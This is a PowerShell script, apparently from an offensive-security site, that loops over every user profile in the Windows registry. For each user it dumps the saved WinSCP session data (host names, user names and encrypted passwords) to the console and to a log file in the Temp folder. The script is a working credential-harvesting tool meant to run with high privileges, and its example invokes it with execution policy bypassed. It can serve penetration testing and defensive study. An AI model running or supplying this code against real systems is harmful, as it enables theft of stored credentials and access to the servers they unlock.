<#
.DESCRIPTION
    Loops through all users in registry (HKLM) and dumps saved WinSCP session data. 
    Needless to say the script should to be run as a *high privileged user* to get as much information as possible.

.EXAMPLE
	PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\winscp_dump.ps1
	[+] User: void - Session: root@127.0.0.1
	  HostName: 127.0.0.1
	  UserName: root
	  EncPassword: A35C745EFEDC2E3333286D6E6B726C726C726D0834352F152F11250F393F2E39280C3D2F2F2B387D7E7F6D7D7E7F5B3C20AF

	[+] Saved all output to logfile: C:\Users\void\AppData\Local\Temp\winscp_dump.log

.NOTES
    Author: 0xPThree @ Exploit.se
    Date: 2024-06-13
    Version: 1.0
#>

$logFile = "$ENV:Temp\winscp_dump.log"
$sidList = Get-ChildItem "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" | Where-Object { $_.Name -match "S-1-5-21-\d+-\d+-\d+-\d+$" }

foreach ($sidItem in $sidList) {
	$sid = $sidItem.PSChildName
	$userFull = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value
	$user = $userFull.Split('\')[1]
	$registryPath = "Registry::HKEY_USERS\$sid\Software\Martin Prikryl\WinSCP 2\Sessions\"
	$subkeys = Get-ChildItem -Path $registryPath | Where-Object { $_.PSChildName -ne 'Default%20Settings'}

	foreach ($subkey in $subkeys) {
		$session = $subkey.PSChildName
		$sessionValues = Get-ItemProperty -Path $subkey.PSPath -Name "HostName", "Password", "UserName" -ErrorAction SilentlyContinue
		$output = "[+] User: $user - Session: $session"

		Write-Host -NoNewline "[+] " -ForegroundColor DarkGreen; Write-Host -NoNewline "User: $user - Session: $session"; Write-Host ""

		if ($sessionValues) {
			if ($sessionValues.HostName) {
				$hostName = "  HostName: $($sessionValues.HostName)"
				Write-Host $hostName
				$output += "`n$hostName"
			} else {
				$hostNameError = "  HostName property does not exist for this session."
				Write-Host $hostNameError
				$output += "`n$hostNameError"
			}

			if ($sessionValues.UserName) {
				$userName = "  UserName: $($sessionValues.UserName)"
				Write-Host $userName
				$output += "`n$userName"
			} else {
				$userNameError = "  UserName property does not exist for this session."
				Write-Host $userNameError
				$output += "`n$userNameError"
			}
			
			if ($sessionValues.Password) {
				$encPassword = "  EncPassword: $($sessionValues.Password)"
				Write-Host "$encPassword`n"
				$output += "`n$encPassword"
			} else {
				$passwordError = "  Password property does not exist for this session."
				Write-Host $passwordError
				$output += "`n$passwordError"
			}
			
		} else {
			$sessionError = "Error retrieving session values for session: $session"
			Write-Host $sessionError
			$output += "`n$sessionError"
		}
		$output | Out-File -FilePath $logFile -Append
	}
	Write-Host -NoNewline "[+] " -ForegroundColor DarkGreen; Write-Host -NoNewline "Saved all output to logfile: $logFile"; Write-Host ""
}